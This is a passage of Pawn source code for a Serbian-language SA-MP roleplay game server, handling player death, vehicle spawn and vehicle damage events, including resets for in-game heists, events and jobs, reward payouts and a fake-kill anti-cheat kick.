            SendClientMessageToAll(-1, ""col_red"REPORTER: "col_white"Kako doznajemo policija je pronasla kriminalnu organizaciju i vratila sliku u "col_red"MUZEJ"col_white"!");
            SendClientMessageToAll(-1, ""col_red"===============================================================================================================");
        }
    }

    if(NosiFavella[playerid]) {

        SendInfoMessage(playerid, "Umro si dok si nosio torbu novca!");

        NosiFavella[playerid] = false;

        RemovePlayerAttachedObject(playerid, 8);

        new Float:IgracPosX, Float:IgracPosY, Float:IgracPosZ;
        GetPlayerPos(playerid, IgracPosX, IgracPosY, IgracPosZ);
        defer KreirajNovacFavellaPickup(Float:IgracPosX, Float:IgracPosY, Float:IgracPosZ);
    }

    if(NosiPaket[playerid]) {

        SendInfoMessage(playerid, "Umro si dok si nosio torbu novca!");

        NosiPaket[playerid] = false;

        DisablePlayerCheckpoint(playerid);

        RemovePlayerAttachedObject(playerid, 8);

        defer KreirajPickup();
    }

    if(DronVozi[playerid] != -1) {

        Novi_DestroyVehicle( DronVozi[ playerid ] );
        DronVozi[ playerid ] = -1;
    }

    // if(MichaelMisija1CP2[playerid]) {

    //     if(IsPlayerNPC(killerid)) {

    //         MichaelMisija1CP2[playerid] = false;
    //         Novi_DisablePlayerCheckpoint(playerid);
    //         SendInfoMessage(playerid, "Nisi uspeo da izvrsis misiju!");
    //         return 1;
    //     }
    //     return 1;
    // }

    if(NosiZlataraTorbu[playerid]) {

        SendInfoMessage(playerid, "Nisi uspeo da odneses torbu!");
        RemovePlayerAttachedObject(playerid, 0);
        Novi_DisablePlayerCheckpoint(playerid);
        NosiZlataraTorbu[playerid] = false;
        return 1;
    }

    if(RobaZlataru[playerid]) {

        stop TimerRobZlatara;

        UnistiBusilicuZlatara();

        PostaviBusilicuZlatara[playerid] = false;
        BusilicaTimeZlatara[playerid] = 0;
        ZlataraRobUToku = false;
        ZlataraOrobana = true;
        RobaZlataru[playerid] = false;
        PokupiTorbuZlatara[playerid] = false;
        PostaviBusilicuZlatara[playerid] = false;

        defer SledeciRobZlatare();

        SendClientMessageToAll(-1, ""SRVBOJA1SCM"====================================="col_white" [ VANDREDNE VESTI ] "SRVBOJA1SCM"=====================================");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Obavestavamo gradjane da je policija uspesno sprecila pljacku "SRVBOJA1SCM"ZLATARE"col_white"!");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Za svoje dobro delo, grad ih nagradjuje novcanom nagradom od "SRVBOJA1SCM"15.000$"col_white" svakom clanu Policije!");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"===============================================================================================================");

        foreach( Player, i ) {

            if( IsPlayerConnected( i ) ) {
                
                if(ClanPolicije(i) && !isPlayerAFK(i)) {

                    DajIgracuNovac(i, 15000);
                    SendInfoMessage(i, "Za uspesno sprecavanje pljacke dobio si 15.000$!");
                }
            }
        }


    }

    if(RadiVojnik{playerid}) {

        if(IsPlayerNPC(killerid)) {

            SendJobMessage(playerid, "Umro si radeci posao vojnik!");
            RadiVojnik{playerid} = false;
            VojnikMisijaJedanCP{playerid} = 0;
            VojnikMisijaJedanVozilo[playerid] = 0;
            GeneralTimer{playerid} = 0;
            UzeoOpremuVojnik{playerid} = false;
            Vakcina[playerid] = 0;
            UpucaoObjekat{playerid} = false;
            TrebaDaPokupiVakcinu{playerid} = false;
            TrebaDaUstane{playerid} = false;
            UbioActora{playerid} = false;
            UbioActora1{playerid} = false;
            UbioActora2{playerid} = false;
            UbioActora3{playerid} = false;
            UpucajNaucnika1{playerid} = false;
            UpucajNaucnika2{playerid} = false;
            UpucajNeprijatelja1{playerid} = false;
            UpucajNeprijatelja2{playerid} = false;
            return 1;
        }
    }

    if(DeagleMasterIgra[playerid] == true)
    {
        Iter_Remove(DeagleMasterPlayers, playerid);
        DeagleMasterIgraci--;
        if(DeagleMasterIgraci == 1)
        {
            va_SendClientMessageToAll(0xF81414FF, "[DeagleMaster] "col_white"Igrac %s je ubio igraca %s i pobedio u Deagle Master! Cestitke pobedniku!", ImeIgraca(killerid), ImeIgraca(playerid));
            DajIgracuNovac(killerid, 10000);
            DeagleMasterIgra[playerid] = false;
            DeagleMasterIgra[killerid] = false;
            Novi_SetPlayerHealth(killerid, 0.0);
            DeagleMasterPokrenut = false;
            DeagleMasterIgraci = 0;
            Iter_Remove(DeagleMasterPlayers, killerid);
            SpawnPlayer(killerid);
            return 1;
        }
        else
        {
            if(killerid != INVALID_PLAYER_ID)
                va_SendClientMessageToAll(0xF81414FF, "[DeagleMaster] "col_white"Igrac %s je ubio igraca %s! Preostalo ucesnika %d!", ImeIgraca(killerid), ImeIgraca(playerid), DeagleMasterIgraci);
            else 
                va_SendClientMessageToAll(0xF81414FF, "[DeagleMaster] "col_white"Igrac %s je umro prirodnom smrcu!Preostalo ucesnika %d!", ImeIgraca(playerid), DeagleMasterIgraci);
            DeagleMasterIgra[playerid] = false;
        }
    }

    if(BezanjeZatvor[playerid] >= 1) {

        SendInfoMessage(playerid, "Beg iz zatvora neuspesan! Vracas se nazad sa produzenom kaznom!");
        PlayerInfo[playerid][xWanted] = 0;
        Novi_SetPlayerWantedLevel(playerid, 0);
        PlayerInfo[playerid][xZatvorVreme] += 15;
        SetPlayerWorldBounds(playerid, -1398.697143, -1472.672607, -1443.334228, -1605.534057);
        stop ZatvorBegProvera;
        return 1;
    }

	if(RobHouseCount[playerid] != 0) {

		stop TimerRobHouse;
		defer TimerParSekundi(playerid);
		SendInfoMessage(playerid, "Umro si pre zavrsetka pljacke kuce!");
		PlayerInfo[playerid][xRobanjeKuce] = 25;
		return 1;
	}

	if(RobTrafikaKurac{playerid} != 0) 
	{
		SendInfoMessage(playerid, "Umro si pre zavrsetka pljacke trafike!");
		PrekinuoRob{playerid} = 1;
		stop TimerRobTrafika;
		RobTrafikaKurac{playerid} = 0;
        PlayerInfo[playerid][xRobanjeTrafike] = 15;
		TogglePlayerControllable(playerid, 1);
		ClearAnimations(playerid);
	}

    if(HotRunIgra[playerid]) {

        Iter_Remove(HotRunPlayers, playerid);
        HotRunIgra[playerid] = false;
        HotRunIgraci--;
        if(HotRunIgraci == 1) {

            new pobednik = Iter_First(HotRunPlayers);
            
            va_SendClientMessageToAll(-1, "[HotRun]Igrac %s je pobedio u HotRun Eventu! Cestitke pobedniku!", ImeIgraca(pobednik));
            DajIgracuNovac(pobednik, 10000);
            Novi_SetPlayerHealth(pobednik, 0.0);

            HotRunIgra[pobednik] = false;
            HotRunIgraci = 0;
            HotRunPokrenut = false;

            Iter_Remove(HotRunPlayers, pobednik);

            SpawnPlayer(pobednik);
            return 1;

        }

    }

	if(HungerGame{playerid} == true)
	{
		Iter_Remove(HungerGamesIgraci, playerid);
		HungerPokrenut--;
		if(HungerPokrenut == 2)
		{
			va_SendClientMessageToAll(-1, "[HungerGames]Igrac %s je ubio igraca %s i pobedio u Hunger Gamesu! Cestitke pobedniku!", ImeIgraca(killerid), ImeIgraca(playerid));
			DajIgracuNovac(killerid, 10000);
			HungerGame{playerid} = false;
			HungerGame{killerid} = false;
			OtvorioMegaKutiju{killerid} = false;
			Novi_SetPlayerHealth(killerid, 0.0);
			HungerPokrenut = 0;
			stop KutijaTimercic;
			OtvorioMegaKutiju{playerid} = 0;
			Iter_Remove(HungerGamesIgraci, killerid);
			SpawnPlayer(killerid);
			return 1;
		}
		else
		{
			new PromenaHungera = HungerPokrenut - 1;
			va_SendClientMessageToAll(-1, "[HungerGames]Igrac %s je ubio igraca %s!Preostalo ucesnika %d!", ImeIgraca(killerid), ImeIgraca(playerid), PromenaHungera);
			HungerGame{playerid} = false;
			stop KutijaTimercic;
		}
	}

	if(HakujeBratina[playerid] == 1)
	{
		stop HakovanjeBankaTimer;
		SendInfoMessage(playerid, "Ubijen si dok si hakovao banku!");
		HakujeBratina[playerid] = 0;
		BankHackOdbrojavanje[playerid] = 0;
	}
	
	PlayerInfo[ playerid ][ xSpawned ] = 0;
	
    if( NaDmEventu[ playerid ] == true ) {
        new scm_string[ 128 ];
        if( killerid != INVALID_PLAYER_ID && NaDmEventu[ killerid ] == true ) { 
            PlayerInfo[ killerid ][ xDMEventUbistva ]++;
            format( scm_string, sizeof( scm_string ),"(DM Zona) %s je ubio %s!", ImeIgraca( killerid ), ImeIgraca( playerid ) );
		    DMZPoruka( WARLJUB, scm_string );
        }
        return 1;
    }
    
    if( PlayerInBlowJob[ playerid ] != 0 ) {

		switch( PlayerInBlowJob[ playerid ] ) {

	        case 1: {

				DestroyActor( Sex_Lisa );
				WhoreLisa = false;
			}
	        case 2: {

				DestroyActor( Sex_Angelina );
				WhoreAngelina = false;
			}
	        case 3: {

				DestroyActor( Sex_Mia );
				WhoreMia = false;
			}
	        case 4: {

				DestroyActor( Sex_Sendy );
				WhoreSendy = false;
			}
		}

		StopAudioStreamForPlayer( playerid );
	    SetCameraBehindPlayer( playerid );
        PlayerInBlowJob[ playerid ] = 0;
    	SexTDControl( playerid, false );
    	BlowJobCount[ playerid ] = 0;
	    TogPlayerHud( playerid );
	    TogglePlayerControllable( playerid, ( true ) );
		ClearAnimations( playerid );
    	Novi_KillTimer( PusenjeTimer[ playerid ] );
	}
    
	antiCheatCS[ playerid ][ TeleportCheck ] = 2;
	antiCheatCS[ playerid ][ WeaponDetect ] = 2;
	
	if( SearchNadji[ playerid ] != -1 ) {
	
		SearchNadji[ playerid ] = -1;
		Novi_DisablePlayerCheckpoint( playerid );
	}
	
	if( ListaPrikazana[ playerid ] ) {
		KladionicaTDControl( playerid, false );
	}
    if( MojListicPrikazan[ playerid ] ) {
		KladionicaListicTDControl( playerid, false );
	}
	if( RezultatiPrikazana[ playerid ] ) {
		RezultatiTDControl( playerid, false );
	}
	
	if( ( gettime( ) - FakeKillTime[ playerid ] ) < 5 ) {

	    FakeKillPlus[ playerid ]++;
	    if( FakeKillPlus[ playerid ] >= 3 ) {
	        
	        format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Fake kill", ImeIgraca( playerid ) );
			AdminPoruka( SVETLOCRVENA, globalstring );
			Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Fake kill");
	    }
	    FakeKillTime[ playerid ] = gettime( );
	    return 0;
	}

	FakeKillTime[ playerid ] = gettime( );
	
	
	if( gZone_ID[ playerid ] != -1 ) {

		new gZone__ID = gZone_ID[ playerid ];

		GangZoneStopFlashForAll( gZoneInfo[ gZone__ID ][ gZoneID ] );
	    gZone_Time[ playerid ] = 0;
	    Novi_KillTimer( gZone_Timer[ playerid ] );


	    if( gZoneInfo[ gZone__ID ][ gZoneGangID ] != -1 ) {

    		format( globalstring, sizeof( globalstring ), "[TERITORIJA] Clan suparnicke bande %s koji je zauzimao teritoriju je ubijen.", OI[ PlayerInfo[ playerid ][ xClan ] ][ oName ] );
            OrgPoruka( gZoneInfo[ gZone__ID ][ gZoneGangID ], 0xFFC801C8, globalstring );
		}

		format( globalstring, sizeof( globalstring ), "[TERITORIJA] Clan %s je ubijen te je prestao sa zauzimanjem.", ImeIgraca( playerid ) );
        OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xFFC801C8, globalstring );

	    gZone_ID[ playerid ] = -1;

	}
	
	
	if( PlayerCement[ playerid ] != -1 ) VehCement[ PlayerCement[ playerid ] ] = false;

	if( PlayerInfo[ playerid ][ xHitmenCena ] > 0 ) {
	    if( IsPlayerConnected( killerid ) ) {
			if( OI[ PlayerInfo[ killerid ][ xClan ] ][ oTip ] == ORG_TIP_HITM ) {
		        if( HitmanInfo[ killerid ][ GoChase ] == playerid ) {
					DajIgracuNovac( killerid, PlayerInfo[ playerid ][ xHitmenCena ] );
                    for( new id = 1; id < MAX_ORG; id++) {
		    			if( OI[ id ][ oTip ] == ORG_TIP_HITM ) {
		    			    format( globalstring, sizeof( globalstring ), "Agent %s je izvrsio svoju narudzbu %s i zaradio $%d", ImeIgraca( killerid ), ImeIgraca( playerid ), PlayerInfo[ playerid ][ xHitmenCena ] );
							OrgPoruka( id, ZUTA, globalstring );
						}
					}
					format( globalstring, sizeof( globalstring ), "|Hitman| %s je ubio: %s", ImeIgraca( killerid ), ImeIgraca( playerid ) );
					AdminPoruka( 0x83BFBFAA, globalstring );
					PlayerInfo[ playerid ][ xHitmenCena ] = 0;
					HitmanInfo[ killerid ][ GoChase ] = 999;
					HitmanInfo[ playerid ][ GetChased ] = 999;
					HitmanInfo[ playerid ][ GotHit ] = 0;
				}
			}
		}
	}

	if( PlayerInfo[ playerid ][ xLevel ] >= 5 && NaDmEventu[ playerid ] == false && GetFactionType( playerid ) != ORG_TIP_PD ) {

	    new Float:pPosX, Float:pPosY, Float:pPosZ;
		GetPlayerPos( playerid, pPosX, pPosY, pPosZ );
		new weaponsa[ 13 ][ 2 ];
	    for( new i_slot = 0; i_slot < 13; i_slot++ ) {
			GetPlayerWeaponData( playerid, i_slot, weaponsa[ i_slot ][ 0 ], weaponsa[ i_slot ][ 1 ] );
			if( weaponsa[ i_slot ][ 0 ] != 0 && weaponsa[ i_slot ][ 1 ] != 0 ) CreateDroppedGun( weaponsa[ i_slot ][ 0 ], weaponsa[ i_slot ][ 1 ], pPosX+random(2)-random(2), pPosY+random(2)-random(2), pPosZ );
		}
	}
	
    SetPVarInt( playerid, "OfficerUndercover", 0 );
	ElectricOprema[ playerid ] = false;

 	if( PljackaNovac[ playerid ] > 0 ) {
		PljackaNovac[ playerid ] = 0;
		VremeZaNovac[ playerid ] = 0;
		PljackaVreme[ playerid ] = 0;
		SCM( playerid, NARACRVENA, "Niste preziveli 2 minuta, izgubili ste opljackani novac." );
	}

	
	if( PljackaZlato[ playerid ] > 0 ) {
		PljackaZlato[ playerid ] = 0;
		VremeZaZlato[ playerid ] = 0;
		ZlatoVreme[ playerid ] = 0;
		SCM( playerid, NARACRVENA, "Niste preziveli 2 minuta, izgubili ste opljackano zlato." );
	}
	
	if( farmerInfo[ playerid ][ fiVehicleBucket ] != -1 ) {
		new farmvehicle = farmerInfo[ playerid ][ fiVehicleBucket ];

		farmerVehicles[ farmvehicle ][ fvMilk ] = false;
    	farmerVehicles[ farmvehicle ][ fvMilkpID ] = -1;
	}
	
	if( ( reason >= 0 && reason <= 34 ) || reason == 49 ) {
	
	    format( globalstring, sizeof( globalstring ), "[%d] %s je ubio igraca %s [%d]!", killerid, ImeIgraca( killerid ), ImeIgraca( playerid ), playerid );
		AdminPoruka( 0xFFE65AAA, globalstring );
		
	    if( killerid != INVALID_PLAYER_ID && GetFactionType( killerid ) != ORG_TIP_PD ) {

            if(!PubgIgra[playerid] && !DeagleMasterIgra[playerid] && !HungerGame{playerid}) {

    	        if( PlayerInfo[ killerid ][ xZatvor ] != 0 ) {
    	            SCM( killerid, SVETLOCRVENA, "ZATVOR | Ubili ste igraca u zatvoru i dobili 10 minuta dodatne kazne!");
    				PlayerInfo[ killerid ][ xZatvorVreme ] += 10;
    	        }
    	        else {
    	    		PostaviWanted( killerid, "Ubistvo prvog stepena", "Nepoznati", 5 );
                    
    			}
            }
		}
		else if( killerid != INVALID_PLAYER_ID && GetFactionType( killerid ) == ORG_TIP_PD ) {
	        if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) {
			    new price = PlayerInfo[ playerid ][ xWanted ] * 1000;

				GameTextForPlayer( killerid, "~w~Osumnjiceni~r~Ubijen", 5000, 1 );
				PlayerPlaySound( killerid, 1058, 0.0, 0.0, 0.0 );

				DajIgracuNovac( playerid, -price );
                DajIgracuNovac( killerid, price);
                SendInfoMessage(killerid, "Ubio si osumnjicenog i zaradio %d$", price);

			    SendClientMessageEx( playerid, SVETLOCRVENA, "Gubite %d$ jer ste bjezali od policije a policajac vas je ubio.", price );

				PlayerInfo[ playerid ][ xWanted ] = 0;
				Novi_SetPlayerWantedLevel( playerid, PlayerInfo[ playerid ][ xWanted ] );
				strmid( ZlocinInfo[ playerid ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ playerid ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ playerid ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
				SavePlayer( playerid );
			}
		}
	}

	if( PlayerInfo[ playerid ][ xZatvor ] == 0 ) PlayerInfo[ playerid ][ xUbijen ] = 1;
	
	if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) {
		new price = PlayerInfo[ playerid ][ xWanted ] * 1000;
		DajIgracuNovac( playerid, -price );
        SendClientMessageEx( playerid, ZUTA, "Umrli ste sa wanted levelom i oduzeto vam je %d$.", price );
        PlayerInfo[ playerid ][ xWanted ] = 0;
	}

	if( Maskuse[ playerid ] == true ) {
     	Maskuse[ playerid ] = false;
     	SetPlayerName( playerid, RealName[ playerid ] );
    }

    if( Draged[ playerid ] != -1 ) {
		Novi_KillTimer( DragTimer[ Draged[ playerid ] ] );
		DragedPlayerID[ Draged[ playerid ] ] = -1;
		Draged[ playerid ] = -1;
	}
	if( DragedPlayerID[ playerid ] != -1) {
		Novi_KillTimer( DragTimer[ playerid ] );
		DragedPlayerID[ playerid ] = -1;
		Draged[ DragedPlayerID[ playerid ] ] = -1;
	}

    if( IsValidDynamicMapIcon( PlayerGpsRadar[ playerid ][ _pgrIconId ] ) ) {
		DestroyDynamicMapIcon( PlayerGpsRadar[ playerid ][ _pgrIconId ] );
	}

    if( IsValidDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] ) ) {
		DestroyDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] );
	}

	if( IsValidDynamicCP( PlayerGpsRadar[ playerid ][ _pgrCheckPointId ] ) ) {
		DestroyDynamicCP( PlayerGpsRadar[ playerid ][ _pgrCheckPointId ] );
	}
	
	Novi_KillTimer( atmrobTimer[ playerid ] );
	
    PlayerGpsRadar[ playerid ][ _pgrIconId ] = -1;
    PlayerGpsRadar[ playerid ][ _pgrObject ] = -1;
    PlayerTextDrawHide(playerid, PlayerGpsRadarText[ playerid ] );

    if( PlayerBuyingAS[ playerid ] != -1 ) {
 	    AutoSalon[ PlayerBuyingAS[ playerid ] ][ AlreadyBuying ] = false;
 	    PlayerBuyingAS[ playerid ] = -1;
	}

    if( antiCheatCS[ playerid ][ TakeVehicle ] != INVALID_VEHICLE_ID ) {
    	BusyVehicle[ antiCheatCS[ playerid ][ TakeVehicle ] ] = -1;
    }


 	if( Uciskolu[ playerid ] == true ) { Novi_KillTimer( SkolaTimer[ playerid ] ); }

	InAmbu[ playerid ] = -1;

	if( TrashSearch[ playerid ] == 1 )  { Novi_KillTimer( TrashTimer[ playerid ] ); TrashSearch[ playerid ] = 0; }

	if(GetPVarInt( playerid, "CuffTimerCalled") == 1 )
	{
	    Novi_KillTimer( TazerTimer[ playerid ] );
	}

	if( offeredByCabbie[ playerid ] != INVALID_PLAYER_ID )
	{
		TaximetarUkljucen[ offeredByCabbie[ playerid ] ] = false;

        PlayerTextDrawSetString( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 6 ], "N/A" );
        PlayerTextDrawShow( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 6 ] );
		PlayerTextDrawSetString( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 7 ], "N/A" );
		PlayerTextDrawShow( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 7 ] );

		CenaVoznje[ offeredByCabbie[ playerid ] ] = 0;
		VoziIgracaID[ offeredByCabbie[ playerid ] ] = INVALID_PLAYER_ID;
		Novi_KillTimer( TaxiTimer[ offeredByCabbie[ playerid ] ] );
		offeredByCabbie[ playerid ] = INVALID_PLAYER_ID;
	}

    if( taxiDuty[ playerid ] == true ) {
		TaximetarUkljucen[ playerid ] = false;

		PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 0 ] );
		PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 1 ] );
		PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 2 ] );
		PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 3 ] );
		PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 4 ] );
		PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 5 ] );
		PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 6 ] );
		PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 7 ] );

		CenaVoznje[ playerid ] = 0;
		VoziIgracaID[ playerid ] = INVALID_PLAYER_ID;
		offeredByCabbie[ playerid ] = INVALID_PLAYER_ID;
	}


	new caller = GetPVarInt( playerid, "Mobile" );

	if( caller != -1 )
	{
		if( caller < 500 )
		{
			SCM( caller,  0xBFC0C2FF, "   Linija prekinuta....");
			SetPVarInt( caller, "CellTime", 0 );
			SetPVarInt( playerid, "CellTime", 0 );
			SetPVarInt( caller, "Mobile", -1 );
		}
		SetPVarInt( playerid, "Mobile", -1 );
		SetPVarInt( playerid, "CellTime", 0 );
	}

    UzeoOpremu[ playerid ] = false;
    if( AdminDuty[ playerid ] ) {
    	AdminDuty[ playerid ] = false;
	}
	return true;
}

public OnVehicleSpawn( vehicleid ) {
    antiCheatVS[ vehicleid ][ VehTrueHealth ] = 1000;
    antiCheatVS[ vehicleid ][ VehCheck ] = 1;
    new engine, lights, alarm, doors, bonnet, boot, objective;

    new Float:x,Float:y,Float:z;
	GetVehiclePos( vehicleid, x, y, z );
	RealVehiclePositions[ vehicleid ][ 0 ] = x;
	RealVehiclePositions[ vehicleid ][ 1 ] = y;
	RealVehiclePositions[ vehicleid ][ 2 ] = z;

   	GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
	SetVehicleParamsEx( vehicleid, engine, 0, alarm, 0, 0, 0, objective );

	if(PrivatnoVozilo(vehicleid)) {
	    GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
	    SetVehicleParamsEx( vehicleid, engine, 0, alarm, VehicleInfo[ getVehicleScriptID(vehicleid) ][ vLocked ], 0, 0, objective );

        LinkVehicleToInterior( vehicleid, VehicleInfo[ getVehicleScriptID(vehicleid) ][ vInterior ] );
    	SetVehicleVirtualWorld( vehicleid, VehicleInfo[ getVehicleScriptID(vehicleid) ][ vVirtualWorld ] );
	}

	TuneVehicle( getVehicleScriptID(vehicleid) );

	vCanDrive[ vehicleid ] = 1;
	VehicleObjectCheck( vehicleid );
	ResetVehicleStatistics( vehicleid );
	if( IsVehicleBajs( vehicleid ) ) {
	    GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
		SetVehicleParamsEx( vehicleid, 1, 0, alarm, doors, 0, 0, objective );
	}
	return true;
}

stock IsVehicleUpsideDown(vehicleid)
{
    new Float:quat_w, Float:quat_x, Float:quat_y, Float:quat_z;
    GetVehicleRotationQuat(vehicleid, quat_w, quat_x, quat_y, quat_z);
    return (
        floatabs(
            atan2(
                2 * (quat_y * quat_z + quat_w * quat_x),
                quat_w * quat_w - quat_x * quat_x - quat_y * quat_y + quat_z * quat_z
            )
        ) > 90.0
    );
}

// ptask vehicleWaterCheck[1000](playerid) {

//     if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {

//         new vehicleid = GetPlayerVehicleID(playerid);
//         new Float:depth1, Float:depth2;

//         if(CA_IsVehicleInWater(vehicleid, depth1, depth2) || IsVehicleUpsideDown(vehicleid)) {

//             if(IsVehicleUpsideDown(vehicleid) && IsVehicleMotor(vehicleid) && !CA_IsVehicleInWater(vehicleid, depth1, depth2)) return 1;

//             if(vehicleid == WorkShopVeh[playerid] && WorkShopVeh[playerid] != -1) {

//                 Novi_DestroyVehicle(WorkShopVeh[playerid]);
//                 WorkShopVeh[playerid] = -1;
//                 resetWorkshopBuying(playerid);
//             }

//             if(vehicleid == WorkShopVehTow[playerid] && WorkShopVehTow[playerid] != -1) {

//                 Novi_DestroyVehicle(WorkShopVehTow[playerid]);
//                 WorkShopVehTow[playerid] = -1;
//                 resetWorkshopBuying(playerid);
//             }

//             if(vehicleid == DronVozi[playerid] && DronVozi[playerid] != -1) {

//                 Novi_DestroyVehicle( DronVozi[ playerid ] );
//                 DronVozi[ playerid ] = -1;
//             }

//             if(vehicleid == pilotVozilo[playerid] && pilotVozilo[playerid] != -1) {

//                 DisablePlayerCheckpoint(playerid);

//                 radiPilot[ playerid ] = 0;
//                 if(IsValidVehicle(pilotVozilo[playerid]))
//                     Novi_DestroyVehicle(pilotVozilo[playerid]);

//                 pilotVozilo[playerid] = -1;

//                 PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
//                 UzeoOpremu[ playerid ] = false;
//             }

//             if(vehicleid == posaoDrvaVozilo[playerid] && posaoDrvaVozilo[playerid] != -1) {

//                 DisablePlayerCheckpoint(playerid);

//                 prevoziDrva[ playerid ] = 0;
//                 if(IsValidVehicle(posaoDrvaVozilo[playerid]))
//                     Novi_DestroyVehicle(posaoDrvaVozilo[playerid]);

//                 posaoDrvaVozilo[playerid] = -1;

//                 // if(IsValidDynamicObject(posaoDrvaObjekat[i]))
//                 //     DestroyDynamicObject(posaoDrvaObjekat[i]);

//                 PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
//                 UzeoOpremu[ playerid ] = false;
//             }

//             if(vehicleid == kosacVozilo[playerid] && kosacVozilo[playerid] != -1) {

//                 DisablePlayerCheckpoint(playerid);

//                 PokosenaTrava[ playerid ] = 0;
//                 KrenuoKosenje[ playerid ] = false;

//                 Novi_DestroyVehicle(kosacVozilo[playerid]);
//                 kosacVozilo[playerid] = -1;
//                 TogglePlayerControllable( playerid, true );

//                 PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
//                 UzeoOpremu[ playerid ] = false;
//             }
//             if(vehicleid == DeliveryVozilo[playerid] && DeliveryVozilo[playerid] != -1) {

//                 Novi_DisablePlayerCheckpoint(playerid);
//                 DeliveryCP[playerid] = 0;
//                 RadiDelivery[playerid] = false;

//                 Novi_DestroyVehicle(DeliveryVozilo[playerid]);
//                 DeliveryVozilo[playerid] = -1;

//                 PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
//                 UzeoOpremu[ playerid ] = false;
//             }
//             if(vehicleid == RentVozilo[playerid]) {

//                 Novi_DestroyVehicle(RentVozilo[playerid]);
//                 Rentao[playerid] = false;
//                 RentVozilo[playerid] = -1;
//                 SendInfoMessage(playerid, "Rent vozilo ti je unisteno! Vise ga ne rentas.");
//             }
//             if(AdminVozilo[ playerid ] != -1 && vehicleid == AdminVozilo[playerid]) {
//                 Novi_DestroyVehicle( AdminVozilo[ playerid ] ); 
//                 AdminVozilo[ playerid ] = -1;
//             }
//             if( helperVeh[ playerid ] != -1 && vehicleid == helperVeh[playerid] ) Novi_DestroyVehicle( helperVeh[ playerid ] ), helperVeh[ playerid ] = -1;

//             if( VPVeh[ playerid ] != -1 ) Novi_DestroyVehicle( VPVeh[ playerid ] ), VPVeh[ playerid ] = -1;

//             if(OrgVeh[playerid] == vehicleid) {

//                 new id = OrgVehID[playerid];
//                 if(OrgVehBroj[playerid] == 1) {

//                     OrgVehInfo[id][oVehKolicina1]++;
//                 }
//                 if(OrgVehBroj[playerid] == 2) {

//                     OrgVehInfo[id][oVehKolicina2]++;
//                 }
//                 if(OrgVehBroj[playerid] == 3) {

//                     OrgVehInfo[id][oVehKolicina3]++;
//                 }
//                 if(OrgVehBroj[playerid] == 4) {

//                     OrgVehInfo[id][oVehKolicina4]++;
//                 }
//                 if(OrgVehBroj[playerid] == 5) {

//                     OrgVehInfo[id][oVehKolicina5]++;
//                 }
//                 Novi_DestroyVehicle(OrgVeh[playerid]);
//                 OrgVeh[playerid] = -1;
//                 // Delete3DTextLabel(OrgVehLabelIgrac[playerid]);
//                 SacuvajOrgVehPickup(id);
//             }
//         }

//         if(GetVehicleModel(vehicleid) == chopperid)
//         {
//             for(new shg=0;shg<=players;shg++)
//             {
//                 if(GetPVarInt(shg,"chop_id") == vehicleid && GetPVarInt(shg,"roped") == 1)
//                 {
//                     Novi_DisablePlayerCheckpoint(shg);
//                     SetPVarInt(shg,"roped",0);
//                     Novi_DisablePlayerCheckpoint(shg);
//                     ClearAnimations(shg);
//                     TogglePlayerControllable(shg,1);
//                     for(new destr3=0;destr3<=ropelength;destr3++)
//                     {
//                         DestroyDynamicObject(r0pes[shg][destr3]);
//                     }
//                 }
//             }
//         }

//         VehicleObjectCheck( vehicleid );
//         ResetVehicleStatistics( vehicleid );

//         if(Indicators_xqz[vehicleid][2]) DestroyObject(Indicators_xqz[vehicleid][2]), DestroyObject(Indicators_xqz[vehicleid][3]),DestroyObject(Indicators_xqz[vehicleid][5]),Indicators_xqz[vehicleid][2]=0;
//         if(Indicators_xqz[vehicleid][0]) DestroyObject(Indicators_xqz[vehicleid][0]), DestroyObject(Indicators_xqz[vehicleid][1]),DestroyObject(Indicators_xqz[vehicleid][4]),Indicators_xqz[vehicleid][0]=0;
//     }

//     return 1;
// }

public OnVehicleHealthChange(vehicleid,Float:newhealth,Float:oldhealth) {


    if(newhealth <= 250) {
        
        foreach(Player, i) {

            if(vehicleid == WorkShopVeh[i] && WorkShopVeh[i] != -1) {

                Novi_DestroyVehicle(WorkShopVeh[i]);
                WorkShopVeh[i] = -1;
                resetWorkshopBuying(i);
            }

            if(vehicleid == WorkShopVehTow[i] && WorkShopVehTow[i] != -1) {

                Novi_DestroyVehicle(WorkShopVehTow[i]);
                WorkShopVehTow[i] = -1;
                resetWorkshopBuying(i);
            }

            if(vehicleid == DronVozi[i] && DronVozi[i] != -1) {

                Novi_DestroyVehicle( DronVozi[ i ] );
